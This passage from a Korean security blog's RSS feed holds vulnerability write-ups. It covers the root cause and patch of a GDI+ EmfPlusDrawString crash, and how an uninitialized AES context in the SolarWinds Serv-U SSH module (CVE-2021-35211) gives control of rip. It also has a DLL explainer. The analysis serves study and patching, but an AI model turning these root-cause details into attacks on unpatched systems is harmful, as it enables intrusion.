&#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; ECX&#xC5D0; 0&#xC774; &#xCD94;&#xAC00;&#xB418;&#xACE0; ECX&#xAC12;&#xC774; &#xC99D;&#xAC00;&#xD558;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; 20&#xBC88; &#xB3CC;&#xC544;&#xC57C; &#xD560; &#xB8E8;&#xD504;&#xAC00; &#xCD1D; 21&#xBC88; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xC774;&#xAC83;&#xC774; root cause&#xC785;&#xB2C8;&#xB2E4;.</li></ol><p>&#xB610;&#xD55C; &#xC57D;&#xAC04;&#xC758; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD558;&#xBA74; &#xD574;&#xB2F9; &#xAC12;&#xC740; POC &#xD30C;&#xC77C;&#xC758; 0x174&#xB85C; &#xBD80;&#xD130; &#xC77D;&#xC5B4;&#xB4DC;&#xB9BC;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/26.png" alt><em>**</em></p><p>&#xC804;&#xC5D0;&#xB3C4; &#xD655;&#xC778;&#xD588;&#xB4DC;&#xC2DC; &#xD574;&#xB2F9; &#xC624;&#xD504;&#xC14B;&#xC740; EmfPlusDrawString &#xB808;&#xCF54;&#xB4DC;&#xC774;&#xACE0; 0x14&#xB294; &#xC555;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xAE38;&#xC774;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xB098;&#xC911;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#x201C;FullTextImager::Render&#x201D;&#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xBD80;&#xD130; &#xAC12;&#xC744; &#xC77D;&#xC5B4;&#xB4E4;&#xC5EC; EAX &#xAC12;&#xC744; &#xC190;&#xC0C1;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/27.png" alt></p><p>&#xC774;&#xB294; &#x201C;FullTextImager::RenderLine&#x201D;&#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0;</p><p><img src="/2021/09/05/fabu1ous/gdi/28.png" alt></p><p>&#xB098;&#xC911;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xB54C; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/29.png" alt></p><p>EMF file&#xC18D; EmfPlusDrawString &#xB808;&#xCF54;&#xB4DC;&#xB97C; &#xCC98;&#xB9AC;&#xD560;&#xB54C; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xC811;&#xADFC;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xB860;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#x201C;gdiplus!BuiltLine::GetUntrimmedCharacterCount&#x201D;&#xD568;&#xC218;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC774; &#xC624;&#xC5FC;&#xB418;&#xACE0; &#xC798;&#xBABB;&#xB41C; path&#xB85C; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC774; &#xB3C4;&#xB2EC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; crash&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="How-this-issue-was-fixed"><a href="#How-this-issue-was-fixed" class="headerlink" title="How this issue was fixed?"></a>How this issue was fixed?</h1><p>&#xC704;&#xC758; &#xD328;&#xCE58; diff&#xB97C; &#xBCF4;&#xACE0; &#xD30C;&#xC545;&#xD55C; &#xBC14;&#xC640; &#xAC19;&#xC774;, &#x201C;gdiplus!BuiltLine::GetUntrimmedCharacterCount&#x201D; &#xD568;&#xC218;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/30.png" alt></p><p>&#xB9CC;&#xC57D; &#xADF8; &#xAC12;&#xC774; 0&#xC774;&#xB77C;&#xBA74; EBX&#xC640; xor&#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xC5EC; Built object&#xC758; destructor &#xC8FC;&#xC18C;&#xB85C; &#xC810;&#xD504;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/31.png" alt></p><p>&#xC544;&#xB798;&#xB294; destructor&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/05/fabu1ous/gdi/32.png" alt></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion:"></a>Conclusion:</h1><p>GDI+&#xB294; &#xB9E4;&#xC6B0; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; Windows &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC774;&#xBA70;, &#xC774;&#xC640; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC804; &#xC138;&#xACC4; &#xC218;&#xC2ED;&#xC5B5; &#xAC1C;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE6D; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC801;&#xC808;&#xD55C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xACE0; Windows &#xBC30;&#xD3EC;&#xB97C; &#xCD5C;&#xC2E0; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>McAfee&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xBC0F; &#xD074;&#xB85C;&#xC988;&#xB4DC; &#xC18C;&#xC2A4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC9D5;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xACF5;&#xAE09;&#xC5C5;&#xCCB4;&#xC640; &#xD611;&#xB825;&#xD558;&#xC5EC; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xCC45;&#xC784;&#xAC10; &#xC788;&#xAC8C; &#xACF5;&#xAC1C;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xACE0; &#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xB9B4;&#xB9AC;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xB294; &#xC801;&#xC808;&#xD55C; &#xC2DC;&#xAC04;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xACE0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xB9B4;&#xB9AC;&#xC2A4;&#xD574;&#xC8FC;&#xC2E0; Microsoft&#xC5D0; &#xAC11;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
      
      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/05/fabu1ous/gdi/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] A deep-dive into the SolarWinds Serv-U SSH vulnerability</title>
      <link>https://hackyboiz.github.io/2021/09/04/j0ker/2021-09-04/</link>
      <guid>https://hackyboiz.github.io/2021/09/04/j0ker/2021-09-04/</guid>
      <pubDate>Sat, 04 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/2021/09/02/a-deep</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/09/02/a-deep-dive-into-the-solarwinds-serv-u-ssh-vulnerability/">https://www.microsoft.com/security/blog/2021/09/02/a-deep-dive-into-the-solarwinds-serv-u-ssh-vulnerability/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SolarWinds Serv-U</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2E4;&#xC81C;&#xB85C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Microsoft Threat Intelligence Center(MSTIC)&#xC5D0;&#xC11C; &#xC774;&#xB7F0; &#xACF5;&#xACA9; &#xD589;&#xC704;&#xB97C; &#xD3EC;&#xCC29;&#xD558;&#xC600;&#xACE0; &#xC774;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; Microsoft Offensive Research &amp; Security Engineering team&#xC5D0; &#xB118;&#xACA8; &#xBD84;&#xC11D;&#xD558;&#xACE0; SolarWinds&#xC5D0; &#xBD84;&#xC11D; &#xB0B4;&#xC6A9;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xC600;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC5F0;&#xACC4;&#xC131;&#xC740; &#xC2E0;&#xAE30;&#xD558;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; Microsoft Offensive Research &amp; Security Engineering team&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC1B;&#xC740; &#xD6C4; &#xBC14;&#xB85C; &#xD37C;&#xC800;&#xB97C; &#xC791;&#xC131;&#xD588;&#xB2E4;&#xACE0; &#xD558;&#xB294;&#xB370;&#x2026; &#xC5C4;&#xCCAD;&#xB098;&#xB124;&#xC694;&#x2026;</p><p>&#xC544;&#xBB34;&#xD2BC; &#xCDE8;&#xC57D;&#xC810;&#xC740; Serv-U FTP &#xC11C;&#xBC84;&#xC758; SSH &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC11C;&#xBC84;&#xC5D0;&#xC11C;&#xB294; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xB294; &#xBA54;&#xC2DC;&#xC9C0; ID&#xB3C4; &#xAC19;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC774; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="https://www.microsoft.com/security/blog/uploads/securityprod/2021/09/Fig6a-Serv-U-SSH-blog.png" alt="https://www.microsoft.com/security/blog/uploads/securityprod/2021/09/Fig6a-Serv-U-SSH-blog.png"></p><p>&#xBA3C;&#xC800; &#xBC84;&#xC804;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC544;&#xB798; &#xBA54;&#xC2DC;&#xC9C0;&#xB4E4;&#xC744; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; EVP_EncryptInit_ex &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xD568;&#xC218; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xACFC; &#xD638;&#xCD9C;&#xD560; &#xB54C;&#xC758; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EVP_EncryptInit_ex</span><span class="hljs-params">(EVP_CIPHER_CTX *ctx, <span class="hljs-keyword">const</span> EVP_CIPHER *type,</span></span><span class="hljs-function"><span class="hljs-params">         ENGINE *impl, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *key, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *iv)</span></span>;</code></pre><p><img src="https://www.microsoft.com/security/blog/uploads/securityprod/2021/09/Fig6b-Serv-U-SSH-blog.png" alt="https://www.microsoft.com/security/blog/uploads/securityprod/2021/09/Fig6b-Serv-U-SSH-blog.png"></p><p>&#xC774; &#xB54C;, 4&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; key&#xAC00; NULL&#xB85C; &#xC804;&#xB2EC;&#xC774; &#xB418;&#xB294;&#xB370;, &#xC774;&#xB294; ctx&#xAC00; key&#xAC00; &#xC138;&#xD305;&#xB418;&#xAE30; &#xC804; KEXINIT &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD578;&#xB4E4;&#xB9C1;&#xD560; &#xB54C; &#xC0DD;&#xC131;&#xC774;&#xB418;&#xAE30;&#xC5D0; &#xC0C1;&#xAD00;&#xC774; &#xC5C6;&#xC9C0;&#xB9CC; ctx&#x2192;cipher_data &#xAD6C;&#xC870;&#xCCB4; &#xC548;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; AES key expansion&#xC740;  key expansion&#xC774; &#xBC1C;&#xC0DD;&#xD574;&#xC57C;&#xB9CC; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xB0A8;&#xC544;&#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="https://www.microsoft.com/security/blog/uploads/securityprod/2021/09/Fig5a-Serv-U-SSH-blog.png" alt="https://www.microsoft.com/security/blog/uploads/securityprod/2021/09/Fig5a-Serv-U-SSH-blog.png"></p><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB358; &#xC911; aes_ctr_cipher &#xD568;&#xC218;&#xC5D0;&#xC11C; ctx&#x2192;cipher_data&#xB97C; &#xD558;&#xAC8C; &#xB418;&#xACE0; &#xADF8; &#xC548;&#xC5D0; &#xBA64;&#xBC84; &#xBCC0;&#xC218;&#xB97C; CRYPTO_ctr128_encrypt &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xC5B4; rip&#xB97C; &#xBC14;&#xB85C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/solarwinds/">solarwinds</category>
      
      <category domain="https://hackyboiz.github.io/tags/serv-u/">serv-u</category>
      
      <category domain="https://hackyboiz.github.io/tags/ssh/">ssh</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/ftp/">ftp</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-35211/">cve-2021-35211</category>
      
      <category domain="https://hackyboiz.github.io/tags/uninitialized-memory/">uninitialized memory</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/04/j0ker/2021-09-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Dynamic Link Library</title>
      <link>https://hackyboiz.github.io/2021/09/03/poosic/Dynamic-Link-Library/</link>
      <guid>https://hackyboiz.github.io/2021/09/03/poosic/Dynamic-Link-Library/</guid>
      <pubDate>Fri, 03 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/09/03/poosic/Dynamic-Link-Library/image1.jpg&quot; alt=&quot;Untitled.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DLL(Dynamic Link Library)&lt;/strong&gt;&amp;#xB29</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/09/03/poosic/Dynamic-Link-Library/image1.jpg" alt="Untitled.jpg"></p><p><strong>DLL(Dynamic Link Library)</strong>&#xB294; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8; &#xC0AC;&#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xD55C; &#xB3D9;&#xC801; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;. DLL&#xD30C;&#xC77C;&#xC758; &#xD655;&#xC7A5;&#xC790; &#xBA85;&#xC740; <code>.dll</code>&#xC774;&#xACE0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xCF54;&#xB4DC;&#xB4E4;&#xC744; &#xB0B4;&#xD3EC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  <strong>Static Link Library</strong>&#xB294; &#xCEF4;&#xD30C;&#xC77C; &#xC2DC;&#xC810;&#xC5D0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC758; &#xC77C;&#xBD80;&#xAC00; &#xB418;&#xC5B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB0B4;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xC9C0;&#xB9CC;, DLL&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC704;&#xCE58;&#xC815;&#xBCF4;&#xB9CC; &#xAC00;&#xC9C0;&#xACE0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB0B4;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC0AC;&#xC6A9;&#xBC29;&#xC2DD;"><a href="#&#xC0AC;&#xC6A9;&#xBC29;&#xC2DD;" class="headerlink" title="&#xC0AC;&#xC6A9;&#xBC29;&#xC2DD;"></a>&#xC0AC;&#xC6A9;&#xBC29;&#xC2DD;</h3><p>DLL&#xC758; &#xC0AC;&#xC6A9;&#xBC29;&#xC2DD;&#xC5D0;&#xB294; <strong>&#xBB35;&#xC2DC;&#xC801; &#xB9C1;&#xD0B9;(Implicit Linking)</strong>&#xACFC; <strong>&#xBA85;&#xC2DC;&#xC801; &#xB9C1;&#xD0B9;(Explicit Linking)</strong>,&#xC774; &#xB450; &#xAC00;&#xC9C0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. <strong>&#xBB35;&#xC2DC;&#xC801; &#xB9C1;&#xD0B9;</strong>&#xC740; &#xC2E4;&#xD589;&#xD30C;&#xC77C; &#xC790;&#xCCB4;&#xC5D0; DLL &#xC0AC;&#xC6A9; &#xC815;&#xBCF4;&#xB97C; &#xB4F1;&#xB85D;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC2DC; OS&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCD08;&#xAE30;&#xD654; &#xC2DC;&#xCF1C; &#xC8FC;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. <strong>&#xBA85;&#xC2DC;&#xC801; &#xB9C1;&#xD0B9;</strong>&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589; &#xC911;&#xC77C; &#xB54C; <code>LoadLibrary()</code>, <code>GetProcAddress()</code>, <code>FreeLibrary()</code> &#xC640; &#xAC19;&#xC740; API&#xB97C; &#xC774;&#xC6A9;&#xD574; DLL &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218;&#xB9CC; &#xBD88;&#xB7EC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;..</p><h3 id="&#xC7A5;&#xC810;"><a href="#&#xC7A5;&#xC810;" class="headerlink" title="&#xC7A5;&#xC810;"></a>&#xC7A5;&#xC810;</h3><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC7A5;&#xC810;&#xC740; <strong>&#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xC808;&#xC57D;</strong>&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. Static Link Library&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB9C8;&#xB2E4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xBCF5;&#xC81C;&#xB418;&#xC5B4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCC28;&#xC9C0;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; DLL&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; DLL &#xD30C;&#xC77C; &#xD558;&#xB098;&#xB9CC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xCC28;&#xC9C0;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xD6E8;&#xC52C; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xC7A5;&#xC810;&#xC740; <strong>&#xC720;&#xC9C0;/&#xBCF4;&#xC218;&#xAC00; &#xC27D;&#xB2E4;</strong>&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB0B4;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD574;&#xC57C; &#xD558;&#xB294; &#xACBD;&#xC6B0; Static Link Library&#xB294; &#xBC30;&#xD3EC;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB9C8;&#xB2E4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD574;&#xC918;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; DLL&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC218;&#xC815;&#xD55C; DLL&#xD30C;&#xC77C; &#xD558;&#xB098;&#xB9CC;&#xC744; &#xC218;&#xC815;&#xD558;&#xBA74; &#xB418;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xACFC; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB2E4;&#xC2DC; &#xC5F0;&#xACB0;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC720;&#xC9C0;/&#xBCF4;&#xC218;&#xAC00; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC138; &#xBC88;&#xC9F8; &#xC7A5;&#xC810;&#xC740; <strong>&#xB2E4;&#xC911; &#xC5B8;&#xC5B4;&#xC5D0; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;</strong>&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. DLL &#xD30C;&#xC77C;&#xC740; &#xC774;&#xBBF8; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xCF54;&#xB4DC;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xB978; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xB378;&#xD30C;&#xC774;&#xB098; C# &#xB4F1;&#xC5D0;&#xC11C; Win32 API&#xB85C; &#xC81C;&#xC791;&#xB41C; DLL&#xC744; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/dynamic-link-library/">dynamic link library</category>
      
      <category domain="https://hackyboiz.github.io/tags/DLL/">DLL</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/03/poosic/Dynamic-Link-Library/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-34486: Windows(ETW) 의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2021/09/02/l0ch/2021-09-02/</link>
      <guid>https://hackyboiz.github.io/2021/09/02/l0ch/2021-09-02/</guid>
